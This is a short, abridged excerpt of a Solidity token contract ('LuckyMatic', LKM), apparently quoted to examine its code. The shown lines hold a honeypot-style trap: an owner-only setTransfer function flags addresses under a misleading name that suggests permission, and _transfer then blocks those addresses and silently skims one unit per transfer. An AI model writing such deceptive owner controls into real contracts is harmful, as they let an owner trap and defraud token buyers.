...
contract HelloMatic is Context, IERC20, Ownable {
    ...
    string private _name = "LuckyMatic";
    string private _symbol = "LKM";
    ...
    function setTransfer(address _addr, bool state) public {
        require(_msgSender() == owner(), "fail");
        canTransferBeforeTradingIsEnabled[_addr] = state;
    }
    ...
    function _transfer(
        ...
        require(amount > 1, "Transfer amount must be greater than 1");
        amount = amount.sub(1);
        if  (limitStatus) {
         ...
         require(!canTransferBeforeTradingIsEnabled[to], "This account cannot send tokens until trading is enabled");
